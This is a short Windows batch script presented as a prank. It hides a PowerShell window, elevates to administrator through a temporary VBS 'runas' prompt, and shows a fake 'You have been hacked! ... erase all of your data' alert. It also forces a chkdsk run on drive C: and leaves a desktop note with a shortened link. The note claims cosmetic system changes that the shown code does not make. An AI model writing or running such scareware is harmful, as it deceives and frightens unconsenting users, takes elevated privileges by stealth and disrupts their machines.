:: Copyright (©) 2023 Jesse Hodgson. All Rights Reserved.

@echo off

cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden "Write-Host"

:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

echo x=msgbox("You have been hacked! This program will erase all of your data momentarily..." ,0, "Windows Alerts") >> msgbox.vbs

start msgbox.vbs

echo y|chkdsk C: /f

echo I GOT U LMAO! This was a prank and your computer has not been modified. Though, I did make some asthetic changes to your system which should help avoid eye strain. Hope you like it! For more info go here: https://bit.ly/3RlY3NI >> "%USERPROFILE%\Desktop\HAHALOL.txt"